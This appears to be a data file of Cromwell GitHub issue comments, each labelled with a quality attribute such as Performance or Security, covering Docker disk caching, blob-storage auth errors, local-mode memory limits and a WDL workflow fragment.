:(",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321225693
https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321225693:927,Performance,cache,cached,927,"Here is an example that worked for me for those that are interested.; ```; {; ""manifestFormatVersion"": 2,; ""dockerImageCacheMap"": {""us.gcr.io/broad-gatk/gatk:4.3.0.0"":; {""dockerImageDigest"": ""sha256:e7996ba655225c1cde0a1faec6a113e217758310af2cf99b00d61dae8ec6e9f2"",; ""diskImageName"":""projects/${PROJECT}/global/images/${IMAGE}""}; }. }; ```; There is some details on how the disk image should look on the Google API website. ""The Compute Engine Disk Images to use as a Docker cache. The disks will be mounted into the Docker folder in a way that the images present in the cache will not need to be pulled. The digests of the cached images must match those of the tags used or the latest version will still be pulled. The root directory of the ext4 image must contain image and overlay2 directories copied from the Docker directory of a VM where the desired Docker images have already been pulled. Any images pulled that are not cached will be stored on the first cache disk instead of the boot disk. Only a single image is supported."". After all that it actually took longer using the disk cache :(",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321225693
https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321225693:962,Performance,cache,cache,962,"Here is an example that worked for me for those that are interested.; ```; {; ""manifestFormatVersion"": 2,; ""dockerImageCacheMap"": {""us.gcr.io/broad-gatk/gatk:4.3.0.0"":; {""dockerImageDigest"": ""sha256:e7996ba655225c1cde0a1faec6a113e217758310af2cf99b00d61dae8ec6e9f2"",; ""diskImageName"":""projects/${PROJECT}/global/images/${IMAGE}""}; }. }; ```; There is some details on how the disk image should look on the Google API website. ""The Compute Engine Disk Images to use as a Docker cache. The disks will be mounted into the Docker folder in a way that the images present in the cache will not need to be pulled. The digests of the cached images must match those of the tags used or the latest version will still be pulled. The root directory of the ext4 image must contain image and overlay2 directories copied from the Docker directory of a VM where the desired Docker images have already been pulled. Any images pulled that are not cached will be stored on the first cache disk instead of the boot disk. Only a single image is supported."". After all that it actually took longer using the disk cache :(",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321225693
https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321225693:1089,Performance,cache,cache,1089,"Here is an example that worked for me for those that are interested.; ```; {; ""manifestFormatVersion"": 2,; ""dockerImageCacheMap"": {""us.gcr.io/broad-gatk/gatk:4.3.0.0"":; {""dockerImageDigest"": ""sha256:e7996ba655225c1cde0a1faec6a113e217758310af2cf99b00d61dae8ec6e9f2"",; ""diskImageName"":""projects/${PROJECT}/global/images/${IMAGE}""}; }. }; ```; There is some details on how the disk image should look on the Google API website. ""The Compute Engine Disk Images to use as a Docker cache. The disks will be mounted into the Docker folder in a way that the images present in the cache will not need to be pulled. The digests of the cached images must match those of the tags used or the latest version will still be pulled. The root directory of the ext4 image must contain image and overlay2 directories copied from the Docker directory of a VM where the desired Docker images have already been pulled. Any images pulled that are not cached will be stored on the first cache disk instead of the boot disk. Only a single image is supported."". After all that it actually took longer using the disk cache :(",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321225693
https://github.com/broadinstitute/cromwell/pull/6954#issuecomment-1332204180:390,Security,access,access,390,"I did some cleanup on this yesterday. Things I was planning to do and didn't have time for due to prod incident:; * Check all language to be sure it's really clear when we're dealing with WSM auth tokens and when we're dealing with blob SAS tokens.; * Either a lot more comments throughout or one large comment with pointers throughout, to clarify the different paths we could take to blob access and when they're useful, what they mean.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6954#issuecomment-1332204180
https://github.com/broadinstitute/cromwell/pull/6954#issuecomment-1332204180:158,Usability,clear,clear,158,"I did some cleanup on this yesterday. Things I was planning to do and didn't have time for due to prod incident:; * Check all language to be sure it's really clear when we're dealing with WSM auth tokens and when we're dealing with blob SAS tokens.; * Either a lot more comments throughout or one large comment with pointers throughout, to clarify the different paths we could take to blob access and when they're useful, what they mean.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6954#issuecomment-1332204180
https://github.com/broadinstitute/cromwell/pull/6959#issuecomment-1333846682:0,Modifiability,Config,Config,0,Config is managed here: https://github.com/broadinstitute/firecloud-develop/blob/dev/base-configs/cromwell/cromwell.conf.ctmpl,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6959#issuecomment-1333846682
https://github.com/broadinstitute/cromwell/pull/6959#issuecomment-1333846682:90,Modifiability,config,configs,90,Config is managed here: https://github.com/broadinstitute/firecloud-develop/blob/dev/base-configs/cromwell/cromwell.conf.ctmpl,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6959#issuecomment-1333846682
https://github.com/broadinstitute/cromwell/pull/6959#issuecomment-1343079134:15,Availability,ping,ping,15,"Thanks for the ping, it had slipped my mind.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6959#issuecomment-1343079134
https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357:42,Availability,error,error,42,"We now serenade users with the delightful error. ```; ""failures"": [; {; ""causedBy"": [; {; ""message"": ""Failed to evaluate 's' (reason 1 of 1):; Evaluating read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") failed:; Failed to read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") (reason 1 of 1):; [Attempted 1 time(s)] - ApiException: ; <!DOCTYPE HTML PUBLIC \""-//IETF//DTD HTML 2.0//EN\"">\n<html><head><script src=\""https://us.jsagent.tcell.insight.rapid7.com/tcellagent.min.js\"" tcellappid=\""FCNonprod-NaVu9\"" tcellapikey=\""AQQBBAFLGLOxL7VE9IF9ESlLvCxD5Ykr_7xkQKq_rgn_P58IWjOhOzIh6p3aI4pTWaprlUw\"" tcellbaseurl=\""https://us.agent.tcell.insight.rapid7.com/api/v1\""></script>\n<title>401 Unauthorized</title>\n</head><body>\n<h1>Unauthorized</h1>\n<p>This server could not verify that you\nare authorized to access the document\nrequested. Either you supplied the wrong\ncredentials (e.g., bad password), or your\nbrowser doesn't understand how to supply\nthe credentials required.</p>\n</body></html>\n"",; ""causedBy"": []; }; ],; ""message"": ""Workflow failed""; }; ]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357
https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357:55,Availability,failure,failures,55,"We now serenade users with the delightful error. ```; ""failures"": [; {; ""causedBy"": [; {; ""message"": ""Failed to evaluate 's' (reason 1 of 1):; Evaluating read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") failed:; Failed to read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") (reason 1 of 1):; [Attempted 1 time(s)] - ApiException: ; <!DOCTYPE HTML PUBLIC \""-//IETF//DTD HTML 2.0//EN\"">\n<html><head><script src=\""https://us.jsagent.tcell.insight.rapid7.com/tcellagent.min.js\"" tcellappid=\""FCNonprod-NaVu9\"" tcellapikey=\""AQQBBAFLGLOxL7VE9IF9ESlLvCxD5Ykr_7xkQKq_rgn_P58IWjOhOzIh6p3aI4pTWaprlUw\"" tcellbaseurl=\""https://us.agent.tcell.insight.rapid7.com/api/v1\""></script>\n<title>401 Unauthorized</title>\n</head><body>\n<h1>Unauthorized</h1>\n<p>This server could not verify that you\nare authorized to access the document\nrequested. Either you supplied the wrong\ncredentials (e.g., bad password), or your\nbrowser doesn't understand how to supply\nthe credentials required.</p>\n</body></html>\n"",; ""causedBy"": []; }; ],; ""message"": ""Workflow failed""; }; ]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357
https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357:91,Integrability,message,message,91,"We now serenade users with the delightful error. ```; ""failures"": [; {; ""causedBy"": [; {; ""message"": ""Failed to evaluate 's' (reason 1 of 1):; Evaluating read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") failed:; Failed to read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") (reason 1 of 1):; [Attempted 1 time(s)] - ApiException: ; <!DOCTYPE HTML PUBLIC \""-//IETF//DTD HTML 2.0//EN\"">\n<html><head><script src=\""https://us.jsagent.tcell.insight.rapid7.com/tcellagent.min.js\"" tcellappid=\""FCNonprod-NaVu9\"" tcellapikey=\""AQQBBAFLGLOxL7VE9IF9ESlLvCxD5Ykr_7xkQKq_rgn_P58IWjOhOzIh6p3aI4pTWaprlUw\"" tcellbaseurl=\""https://us.agent.tcell.insight.rapid7.com/api/v1\""></script>\n<title>401 Unauthorized</title>\n</head><body>\n<h1>Unauthorized</h1>\n<p>This server could not verify that you\nare authorized to access the document\nrequested. Either you supplied the wrong\ncredentials (e.g., bad password), or your\nbrowser doesn't understand how to supply\nthe credentials required.</p>\n</body></html>\n"",; ""causedBy"": []; }; ],; ""message"": ""Workflow failed""; }; ]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357
https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357:1193,Integrability,message,message,1193,"We now serenade users with the delightful error. ```; ""failures"": [; {; ""causedBy"": [; {; ""message"": ""Failed to evaluate 's' (reason 1 of 1):; Evaluating read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") failed:; Failed to read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") (reason 1 of 1):; [Attempted 1 time(s)] - ApiException: ; <!DOCTYPE HTML PUBLIC \""-//IETF//DTD HTML 2.0//EN\"">\n<html><head><script src=\""https://us.jsagent.tcell.insight.rapid7.com/tcellagent.min.js\"" tcellappid=\""FCNonprod-NaVu9\"" tcellapikey=\""AQQBBAFLGLOxL7VE9IF9ESlLvCxD5Ykr_7xkQKq_rgn_P58IWjOhOzIh6p3aI4pTWaprlUw\"" tcellbaseurl=\""https://us.agent.tcell.insight.rapid7.com/api/v1\""></script>\n<title>401 Unauthorized</title>\n</head><body>\n<h1>Unauthorized</h1>\n<p>This server could not verify that you\nare authorized to access the document\nrequested. Either you supplied the wrong\ncredentials (e.g., bad password), or your\nbrowser doesn't understand how to supply\nthe credentials required.</p>\n</body></html>\n"",; ""causedBy"": []; }; ],; ""message"": ""Workflow failed""; }; ]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357
https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357:956,Security,authoriz,authorized,956,"We now serenade users with the delightful error. ```; ""failures"": [; {; ""causedBy"": [; {; ""message"": ""Failed to evaluate 's' (reason 1 of 1):; Evaluating read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") failed:; Failed to read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") (reason 1 of 1):; [Attempted 1 time(s)] - ApiException: ; <!DOCTYPE HTML PUBLIC \""-//IETF//DTD HTML 2.0//EN\"">\n<html><head><script src=\""https://us.jsagent.tcell.insight.rapid7.com/tcellagent.min.js\"" tcellappid=\""FCNonprod-NaVu9\"" tcellapikey=\""AQQBBAFLGLOxL7VE9IF9ESlLvCxD5Ykr_7xkQKq_rgn_P58IWjOhOzIh6p3aI4pTWaprlUw\"" tcellbaseurl=\""https://us.agent.tcell.insight.rapid7.com/api/v1\""></script>\n<title>401 Unauthorized</title>\n</head><body>\n<h1>Unauthorized</h1>\n<p>This server could not verify that you\nare authorized to access the document\nrequested. Either you supplied the wrong\ncredentials (e.g., bad password), or your\nbrowser doesn't understand how to supply\nthe credentials required.</p>\n</body></html>\n"",; ""causedBy"": []; }; ],; ""message"": ""Workflow failed""; }; ]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357
https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357:970,Security,access,access,970,"We now serenade users with the delightful error. ```; ""failures"": [; {; ""causedBy"": [; {; ""message"": ""Failed to evaluate 's' (reason 1 of 1):; Evaluating read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") failed:; Failed to read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") (reason 1 of 1):; [Attempted 1 time(s)] - ApiException: ; <!DOCTYPE HTML PUBLIC \""-//IETF//DTD HTML 2.0//EN\"">\n<html><head><script src=\""https://us.jsagent.tcell.insight.rapid7.com/tcellagent.min.js\"" tcellappid=\""FCNonprod-NaVu9\"" tcellapikey=\""AQQBBAFLGLOxL7VE9IF9ESlLvCxD5Ykr_7xkQKq_rgn_P58IWjOhOzIh6p3aI4pTWaprlUw\"" tcellbaseurl=\""https://us.agent.tcell.insight.rapid7.com/api/v1\""></script>\n<title>401 Unauthorized</title>\n</head><body>\n<h1>Unauthorized</h1>\n<p>This server could not verify that you\nare authorized to access the document\nrequested. Either you supplied the wrong\ncredentials (e.g., bad password), or your\nbrowser doesn't understand how to supply\nthe credentials required.</p>\n</body></html>\n"",; ""causedBy"": []; }; ],; ""message"": ""Workflow failed""; }; ]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357
https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357:1056,Security,password,password,1056,"We now serenade users with the delightful error. ```; ""failures"": [; {; ""causedBy"": [; {; ""message"": ""Failed to evaluate 's' (reason 1 of 1):; Evaluating read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") failed:; Failed to read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") (reason 1 of 1):; [Attempted 1 time(s)] - ApiException: ; <!DOCTYPE HTML PUBLIC \""-//IETF//DTD HTML 2.0//EN\"">\n<html><head><script src=\""https://us.jsagent.tcell.insight.rapid7.com/tcellagent.min.js\"" tcellappid=\""FCNonprod-NaVu9\"" tcellapikey=\""AQQBBAFLGLOxL7VE9IF9ESlLvCxD5Ykr_7xkQKq_rgn_P58IWjOhOzIh6p3aI4pTWaprlUw\"" tcellbaseurl=\""https://us.agent.tcell.insight.rapid7.com/api/v1\""></script>\n<title>401 Unauthorized</title>\n</head><body>\n<h1>Unauthorized</h1>\n<p>This server could not verify that you\nare authorized to access the document\nrequested. Either you supplied the wrong\ncredentials (e.g., bad password), or your\nbrowser doesn't understand how to supply\nthe credentials required.</p>\n</body></html>\n"",; ""causedBy"": []; }; ],; ""message"": ""Workflow failed""; }; ]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357
https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357:261,Testability,test,test-data,261,"We now serenade users with the delightful error. ```; ""failures"": [; {; ""causedBy"": [; {; ""message"": ""Failed to evaluate 's' (reason 1 of 1):; Evaluating read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") failed:; Failed to read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") (reason 1 of 1):; [Attempted 1 time(s)] - ApiException: ; <!DOCTYPE HTML PUBLIC \""-//IETF//DTD HTML 2.0//EN\"">\n<html><head><script src=\""https://us.jsagent.tcell.insight.rapid7.com/tcellagent.min.js\"" tcellappid=\""FCNonprod-NaVu9\"" tcellapikey=\""AQQBBAFLGLOxL7VE9IF9ESlLvCxD5Ykr_7xkQKq_rgn_P58IWjOhOzIh6p3aI4pTWaprlUw\"" tcellbaseurl=\""https://us.agent.tcell.insight.rapid7.com/api/v1\""></script>\n<title>401 Unauthorized</title>\n</head><body>\n<h1>Unauthorized</h1>\n<p>This server could not verify that you\nare authorized to access the document\nrequested. Either you supplied the wrong\ncredentials (e.g., bad password), or your\nbrowser doesn't understand how to supply\nthe credentials required.</p>\n</body></html>\n"",; ""causedBy"": []; }; ],; ""message"": ""Workflow failed""; }; ]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357
https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357:414,Testability,test,test-data,414,"We now serenade users with the delightful error. ```; ""failures"": [; {; ""causedBy"": [; {; ""message"": ""Failed to evaluate 's' (reason 1 of 1):; Evaluating read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") failed:; Failed to read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") (reason 1 of 1):; [Attempted 1 time(s)] - ApiException: ; <!DOCTYPE HTML PUBLIC \""-//IETF//DTD HTML 2.0//EN\"">\n<html><head><script src=\""https://us.jsagent.tcell.insight.rapid7.com/tcellagent.min.js\"" tcellappid=\""FCNonprod-NaVu9\"" tcellapikey=\""AQQBBAFLGLOxL7VE9IF9ESlLvCxD5Ykr_7xkQKq_rgn_P58IWjOhOzIh6p3aI4pTWaprlUw\"" tcellbaseurl=\""https://us.agent.tcell.insight.rapid7.com/api/v1\""></script>\n<title>401 Unauthorized</title>\n</head><body>\n<h1>Unauthorized</h1>\n<p>This server could not verify that you\nare authorized to access the document\nrequested. Either you supplied the wrong\ncredentials (e.g., bad password), or your\nbrowser doesn't understand how to supply\nthe credentials required.</p>\n</body></html>\n"",; ""causedBy"": []; }; ],; ""message"": ""Workflow failed""; }; ]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357
https://github.com/broadinstitute/cromwell/issues/6966#issuecomment-1349647888:1373,Deployability,install,install,1373,"I'm not a Cromwell dev, but I've dealt with this quite a lot, so I have some experience here... When resource issues happen on local-Cromwell, it is usually due to scattered tasks either [all running at once (which is the default behavior)](https://broadworkbench.atlassian.net/browse/CROM-6716), or, if they're running one-at-a-time, [things getting stuck](https://github.com/broadinstitute/cromwell/issues/6946). But none of your tasks are scattered, so the usual easy fixes don't apply. Unfortunately, Cromwell ignores most of your runtime arguments when running in ""local mode"" including memory, cpu, and disk size. This isn't something you can configure, it just doesn't know how to handle them. You'll see warnings to that effect when the tasks launch, eg:. ```; [2022-12-13 12:11:22,26] [warn] LocalExample [5aba40a5]: Key/s [preemptible, disks, cpu, memory] is/are not supported by backend. Unsupported attributes will not be part of job executions.; ```. One thing you can try doing to get around this is to make sure Docker is getting as much memory as you can give it. If you're using Docker Desktop, you can do this in Preferences > Resources, then cranking the memory slider as far to the right as you feel comfortable doing. But I do notice you're using a Linux machine, so it's probably a good idea to be using [Docker Engine](https://docs.docker.com/engine/install/) instead of Docker Desktop [if this this issue with the Dockstore CLI, which that uses Cromwell to launch workflows, is any indication](https://github.com/dockstore/dockstore/issues/5135), which has a different way of configuring resources. If you're still having issues, please post a followup -- and others, please chime in too if you have ideas. Resource usage on local runs is a bit of a persistent issue with Cromwell.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6966#issuecomment-1349647888
https://github.com/broadinstitute/cromwell/issues/6966#issuecomment-1349647888:649,Modifiability,config,configure,649,"I'm not a Cromwell dev, but I've dealt with this quite a lot, so I have some experience here... When resource issues happen on local-Cromwell, it is usually due to scattered tasks either [all running at once (which is the default behavior)](https://broadworkbench.atlassian.net/browse/CROM-6716), or, if they're running one-at-a-time, [things getting stuck](https://github.com/broadinstitute/cromwell/issues/6946). But none of your tasks are scattered, so the usual easy fixes don't apply. Unfortunately, Cromwell ignores most of your runtime arguments when running in ""local mode"" including memory, cpu, and disk size. This isn't something you can configure, it just doesn't know how to handle them. You'll see warnings to that effect when the tasks launch, eg:. ```; [2022-12-13 12:11:22,26] [warn] LocalExample [5aba40a5]: Key/s [preemptible, disks, cpu, memory] is/are not supported by backend. Unsupported attributes will not be part of job executions.; ```. One thing you can try doing to get around this is to make sure Docker is getting as much memory as you can give it. If you're using Docker Desktop, you can do this in Preferences > Resources, then cranking the memory slider as far to the right as you feel comfortable doing. But I do notice you're using a Linux machine, so it's probably a good idea to be using [Docker Engine](https://docs.docker.com/engine/install/) instead of Docker Desktop [if this this issue with the Dockstore CLI, which that uses Cromwell to launch workflows, is any indication](https://github.com/dockstore/dockstore/issues/5135), which has a different way of configuring resources. If you're still having issues, please post a followup -- and others, please chime in too if you have ideas. Resource usage on local runs is a bit of a persistent issue with Cromwell.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6966#issuecomment-1349647888
https://github.com/broadinstitute/cromwell/issues/6966#issuecomment-1349647888:1600,Modifiability,config,configuring,1600,"I'm not a Cromwell dev, but I've dealt with this quite a lot, so I have some experience here... When resource issues happen on local-Cromwell, it is usually due to scattered tasks either [all running at once (which is the default behavior)](https://broadworkbench.atlassian.net/browse/CROM-6716), or, if they're running one-at-a-time, [things getting stuck](https://github.com/broadinstitute/cromwell/issues/6946). But none of your tasks are scattered, so the usual easy fixes don't apply. Unfortunately, Cromwell ignores most of your runtime arguments when running in ""local mode"" including memory, cpu, and disk size. This isn't something you can configure, it just doesn't know how to handle them. You'll see warnings to that effect when the tasks launch, eg:. ```; [2022-12-13 12:11:22,26] [warn] LocalExample [5aba40a5]: Key/s [preemptible, disks, cpu, memory] is/are not supported by backend. Unsupported attributes will not be part of job executions.; ```. One thing you can try doing to get around this is to make sure Docker is getting as much memory as you can give it. If you're using Docker Desktop, you can do this in Preferences > Resources, then cranking the memory slider as far to the right as you feel comfortable doing. But I do notice you're using a Linux machine, so it's probably a good idea to be using [Docker Engine](https://docs.docker.com/engine/install/) instead of Docker Desktop [if this this issue with the Dockstore CLI, which that uses Cromwell to launch workflows, is any indication](https://github.com/dockstore/dockstore/issues/5135), which has a different way of configuring resources. If you're still having issues, please post a followup -- and others, please chime in too if you have ideas. Resource usage on local runs is a bit of a persistent issue with Cromwell.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6966#issuecomment-1349647888
https://github.com/broadinstitute/cromwell/issues/6966#issuecomment-1351914943:157,Deployability,pipeline,pipeline,157,"@aofarrel Thanks a lot! This actually worked just fine till I hit the memory wall of 200Gb of RAM. In fact, my Docker launches a tool invoking a _Snakemake_ pipeline for genome inference, the fourth step of which requires 200Gb of memory. Now, prior to your suggestion my `Docker Engine` was running with 20Gb of RAM, I then pushed it to 120. This helped to go through the 3rd step of the _Snakemake_ pipeline, requiring 100Gb of memory and where previously my WDL run was terminated, still the entire script cannot complete its execution due to memory requirement. With that said, I might keep this issue open for a bit longer maybe someone can relate to this and, most importantly, someone without the high memory demand for the tool I'm using might actually get the job done with this simple workaround.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6966#issuecomment-1351914943
https://github.com/broadinstitute/cromwell/issues/6966#issuecomment-1351914943:401,Deployability,pipeline,pipeline,401,"@aofarrel Thanks a lot! This actually worked just fine till I hit the memory wall of 200Gb of RAM. In fact, my Docker launches a tool invoking a _Snakemake_ pipeline for genome inference, the fourth step of which requires 200Gb of memory. Now, prior to your suggestion my `Docker Engine` was running with 20Gb of RAM, I then pushed it to 120. This helped to go through the 3rd step of the _Snakemake_ pipeline, requiring 100Gb of memory and where previously my WDL run was terminated, still the entire script cannot complete its execution due to memory requirement. With that said, I might keep this issue open for a bit longer maybe someone can relate to this and, most importantly, someone without the high memory demand for the tool I'm using might actually get the job done with this simple workaround.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6966#issuecomment-1351914943
https://github.com/broadinstitute/cromwell/issues/6966#issuecomment-1351914943:788,Usability,simpl,simple,788,"@aofarrel Thanks a lot! This actually worked just fine till I hit the memory wall of 200Gb of RAM. In fact, my Docker launches a tool invoking a _Snakemake_ pipeline for genome inference, the fourth step of which requires 200Gb of memory. Now, prior to your suggestion my `Docker Engine` was running with 20Gb of RAM, I then pushed it to 120. This helped to go through the 3rd step of the _Snakemake_ pipeline, requiring 100Gb of memory and where previously my WDL run was terminated, still the entire script cannot complete its execution due to memory requirement. With that said, I might keep this issue open for a bit longer maybe someone can relate to this and, most importantly, someone without the high memory demand for the tool I'm using might actually get the job done with this simple workaround.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6966#issuecomment-1351914943
https://github.com/broadinstitute/cromwell/issues/6971#issuecomment-1355222269:3390,Availability,down,downloading,3390," = 22009; }. call extract_field as year_of_birth { input :; script_dir = script_dir,; id = 34; }. call extract_field as month_of_birth { input :; script_dir = script_dir,; id = 52; }. call extract_field as date_of_death { input :; script_dir = script_dir,; id = 40000; }. call extract_field as phenotype { input :; script_dir = script_dir,; id = phenotype_id; }. scatter (categorical_covariate_id in categorical_covariate_ids) {; call extract_field as categorical_covariates { input :; script_dir = script_dir,; id = categorical_covariate_id; }; }. call platform_agnostic_workflow.main { input:; script_dir = script_dir,. phenotype_name = phenotype_name,; categorical_covariate_names = categorical_covariate_names,; categorical_covariate_scs = categorical_covariates.data,; is_binary = is_binary,; is_zero_one_neg_nan = is_zero_one_neg_nan,; date_of_most_recent_first_occurrence_update = date_of_most_recent_first_occurrence_update,. fam_file = fam_file, # Could instead create a task for downloading this with ukbgene; withdrawn_sample_list = withdrawn_sample_list,. sc_white_brits = white_brits.data,; sc_ethnicity_self_report = ethnicity_self_report.data,; sc_sex_aneuploidy = sex_aneuploidy.data,; sc_genetic_sex = genetic_sex.data,; sc_reported_sex = reported_sex.data,; sc_kinship_count = kinship_count.data,; sc_assessment_ages = assessment_ages.data,; sc_pcs = pcs.data,; sc_year_of_birth = year_of_birth.data,; sc_month_of_birth = month_of_birth.data,; sc_date_of_death = date_of_death.data,; sc_phenotype = phenotype.data; }. 	output {; 		Array[File] out_sample_lists = main.out_sample_lists; 	}; }; ```. platform_agnostic_workflow.wdl; ```; # platform agnostic workflow. version 1.0. import ""tasks.wdl"". workflow main {. input {; String script_dir. String phenotype_name; Array[String] categorical_covariate_names; Array[File] categorical_covariate_scs; Boolean is_binary; Boolean is_zero_one_neg_nan; String date_of_most_recent_first_occurrence_update. File fam_file # task for generating",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971#issuecomment-1355222269
